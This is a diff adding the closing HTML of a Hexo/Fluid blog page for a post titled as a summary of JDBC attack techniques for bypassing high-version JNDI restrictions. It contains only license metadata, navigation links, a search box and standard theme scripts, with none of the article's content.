+      <div>JNDI高版本绕过之JDBCAttack总结</div>
+      <div>http://example.com/2024/06/06/JNDI高版本绕过之JDBCAttack总结/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>June 6, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/07/31/%E4%BB%8Espring%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E6%A1%86%E6%9E%B6%E5%AE%A1%E8%AE%A1-1/" title="从spring历史漏洞学框架审计(1)">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">从spring历史漏洞学框架审计(1)</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/05/20/Apache-Inlong-JDBCAttack%E5%8E%86%E5%8F%B2%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/" title="Apache-Inlong-JDBCAttack历史绕过学习">
+                        <span class="hidden-mobile">Apache-Inlong-JDBCAttack历史绕过学习</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
